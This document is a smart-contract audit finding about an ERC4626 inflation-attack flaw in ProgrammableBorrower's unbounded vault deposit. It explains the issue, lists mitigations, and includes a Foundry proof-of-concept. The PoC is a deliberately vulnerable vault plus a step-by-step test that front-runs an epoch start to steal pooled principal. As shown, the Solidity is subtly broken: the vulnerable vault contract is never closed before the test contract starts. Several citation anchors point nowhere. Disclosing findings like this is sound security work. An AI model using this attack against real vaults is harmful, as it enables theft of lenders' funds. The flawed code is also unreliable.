### Title

Missing minimum-share bound in `ProgrammableBorrower._depositToVault()` permits ERC4626 inflation theft - ([File: `contracts/strategies/idle/ProgrammableBorrower.sol`])

### Summary

`ProgrammableBorrower` deposits idle pool assets into a configured ERC4626 vault through `vault.deposit()` without requiring a minimum number of shares or otherwise validating the returned share amount. [1](#0-0)  An unprivileged vault shareholder can front-run the honest `startEpoch()` transaction, inflate the vault’s assets-per-share through a direct asset donation, cause the borrower’s deposit to mint zero or economically insignificant shares, and redeem their existing shares for both the donation and the pool’s deposit. [2](#0-1)  The programmable borrower then records the pre-deposit balance as epoch principal even though its vault position may be worth zero. [3](#0-2) 

### Finding Description

The vulnerable sequence occurs in the buffer phase before an epoch starts:

1. `IdleCDOEpochVariant.startEpoch()` transfers surplus underlyings to the programmable borrower and invokes `_startEpochProgrammableBorrower()`. [2](#0-1) 
2. `ProgrammableBorrower.onStartEpoch()` calculates `startAssets` from cash plus the current vault position, then deposits the entire cash balance into the configured vault. [4](#0-3) 
3. `_depositToVault()` calls `vault.deposit(_assetAmount, address(this))` and accepts any returned share count, including zero. [1](#0-0) 
4. `_currentVaultAssets()` values the position solely through `vault.convertToAssets(vault.balanceOf(address(this)))`, so a deposit that mints zero shares contributes zero assets afterward. [5](#0-4) 
5. `_vaultNetInterest()` compares current vault assets against the pre-deposit baseline and classifies the resulting shortfall as vault loss. [6](#0-5) 

The analogous withdrawal path also lacks a maximum-shares bound when `onStopEpoch()` calls `vault.withdraw(shortfall, address(this), address(this))`, although the deposit path provides the cleaner theft primitive. [7](#0-6) 

The ERC4626 interface used by the contract explicitly identifies unfavorable discrepancies between previewed and actual exchange amounts as slippage and permits implementations to account for deposit or withdrawal fees. [8](#0-7)  `ProgrammableBorrower` does not use `previewDeposit()` plus a lower bound, a `mint()`-style exact-share call, a post-call `convertToAssets()` check, or a revert on an unexpectedly low share count. [1](#0-0) 

### Impact Explanation

For a donation-vulnerable ERC4626 vault using `assets * totalSupply / totalAssets` without virtual-share protection, the attacker can steal approximately the full deposited amount:

- Pool deposit: `V`.
- Attacker owns one vault share.
- Attacker donates `D >= V` underlying directly to the vault.
- The borrower’s deposit mints `floor(V / (1 + D)) == 0` shares.
- The attacker redeems their one share for approximately `1 + D + V`, receiving both the donation and the pool deposit.

The resulting loss equals `V`, less negligible rounding and the attacker’s initial one-wei deposit. The borrower had included `V` in `epochStartVaultAssets`, so subsequent vault accounting recognizes the missing position as loss rather than yield. [6](#0-5)  This breaks the fair-mint invariant and can become a direct loss of pooled lender principal once the affected epoch or close-pool settlement accounts for the unrecoverable vault sleeve. [9](#0-8) 

### Likelihood Explanation

Likelihood depends on the configured ERC4626 vault lacking sufficient inflation or virtual-share protection. `initialize()` and `setVault()` only verify that the vault’s asset matches the pool’s underlying; they do not verify inflation resistance, minimum liquidity, share decimals, or deposit exchange-rate behavior. [10](#0-9) [11](#0-10) 

No privileged role is required for the exploit transaction itself. The attacker can be an ordinary shareholder of the configured external vault and a direct token sender, while the honest owner or manager merely submits `startEpoch()`. The attack does require front-running that privileged transaction or another transaction that reaches `_depositToVault()`, so likelihood is lower than an always-callable public deposit endpoint. Vaults implementing OpenZeppelin-style virtual assets may reduce this specific rounding attack to negligible size, but the contract accepts generic ERC4626 vaults and still has no local execution-quality bound. [11](#0-10) 

### Recommendation

Use a bounded ERC4626 interaction instead of unconstrained `deposit()` and `withdraw()` calls:

- Prefer `vault.mint(expectedShares, address(this))` when the intended share amount is known.
- Otherwise call `previewDeposit(_assetAmount)`, apply a bounded tolerance such as `minShares = previewDeposit(...) * BPS / 10_000`, and revert if `deposit()` returns less than `minShares`.
- For withdrawals, derive `maxShares` from `previewWithdraw(shortfall)` and verify that `vault.withdraw()` did not burn more than that bound.
- For `redeem()`, verify the returned assets against `previewRedeem(shares)` before updating accounting.
- Treat a zero-share deposit of nonzero assets as an immediate revert, even if the external vault accepts it.
- Consider restricting approved vaults to implementations with known inflation protection and adequate decimals/virtual shares.

### Proof of Concept

The following Foundry fork test demonstrates the invariant break using a minimal ERC4626 implementation whose share formula lacks inflation protection. The production defect remains the missing bound in `ProgrammableBorrower`; the helper vault models an external ERC4626 integration rather than being the target.

```solidity
contract DonationVulnerableERC4626 is ERC20 {
    IERC20 public immutable asset;

    constructor(IERC20 asset_) ERC20("Vault Share", "vSHARE") {
        asset = asset_;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function convertToShares(uint256 assets_) public view returns (uint256) {
        uint256 supply = totalSupply();
        uint256 managed = totalAssets();
        return supply == 0 || managed == 0 ? assets_ : assets_ * supply / managed;
    }

    function deposit(uint256 assets_, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets_);
        asset.transferFrom(msg.sender, address(this), assets_);
        _mint(receiver, shares);
    }

    function withdraw(
        uint256 assets_,
        address receiver,
        address owner_
    ) external returns (uint256 shares) {
        shares = convertToShares(assets_);
        _burn(owner_, shares);
        asset.transfer(receiver, assets_);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner_
    ) external returns (uint256 assets_) {
        assets_ = convertToAssets(shares);
        _burn(owner_, shares);
        asset.transfer(receiver, assets_);
    }

    function previewDeposit(uint256 assets_) external view returns (uint256) {
        return convertToShares(assets_);
    }

    function previewWithdraw(uint256 assets_) external view returns (uint256) {
        return convertToShares(assets_);
    }

    function previewRedeem(uint256 shares) external view returns (uint256) {
        return convertToAssets(shares);
    }

    function maxDeposit(address) external view returns (uint256) {
        return type(uint256).max;
    }

    function maxMint(address) external view returns (uint256) {
        return type(uint256).max;
    }

    function maxWithdraw(address owner_) external view returns (uint256) {
        return convertToAssets(balanceOf(owner_));
    }

    function maxRedeem(address owner_) external view returns (uint256) {
        return balanceOf(owner_);
    }

    function previewMint(uint256 shares) external view returns (uint256) {
        uint256 supply = totalSupply();
        uint256 managed = totalAssets();
        return supply == 0 || managed == 0 ? shares : shares * managed / supply;
    }

    function mint(uint256 shares, address receiver) external returns (uint256 assets_) {
        assets_ = this.previewMint(shares);
        asset.transferFrom(msg.sender, address(this), assets_);
        _mint(receiver, shares);
    }

contract ProgrammableBorrowerSlippageForkTest is Test {
    uint256 internal constant POOL_DEPOSIT = 1_000_000e18;

    function testInflationDepositStealsPoolAssets() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        ForkERC20 asset = new ForkERC20();
        DonationVulnerableERC4626 vault = new DonationVulnerableERC4626(asset);
        FakeIdleCDO cdo = new FakeIdleCDO(address(asset));
        ProgrammableBorrower borrower = new ProgrammableBorrower();

        address attacker = address(0xA11CE);
        address owner = address(0xB0B);
        address manager = address(0xCAFE);
        address realBorrower = address(0xB044);

        borrower.initialize(
            address(vault),
            address(cdo),
            owner,
            manager,
            realBorrower,
            0
        );

        // Attacker creates the initial share and inflates assets/share.
        asset.mint(attacker, POOL_DEPOSIT + 1);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), POOL_DEPOSIT);
        vm.stopPrank();

        // Simulate IdleCDO transferring pool principal to the borrower adapter.
        asset.mint(address(borrower), POOL_DEPOSIT);

        // Honest manager's startEpoch() reaches this hook. The deposited amount
        // mints zero shares because POOL_DEPOSIT / (1 + POOL_DEPOSIT) == 0.
        vm.prank(address(cdo));
        borrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(borrower.totalUnderlying(), 0);
        assertEq(borrower.vaultLoss(), POOL_DEPOSIT);

        uint256 attackerBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        // Attacker receives the original wei, donation, and pool deposit.
        assertEq(asset.balanceOf(attacker), attackerBefore + POOL_DEPOSIT * 2 + 1);
    }
}
```

A production-hardened implementation should make `borrower.onStartEpoch(0)` revert when `vault.deposit(POOL_DEPOSIT, ...)` returns zero shares, preventing the donation recipient from capturing the deposit.
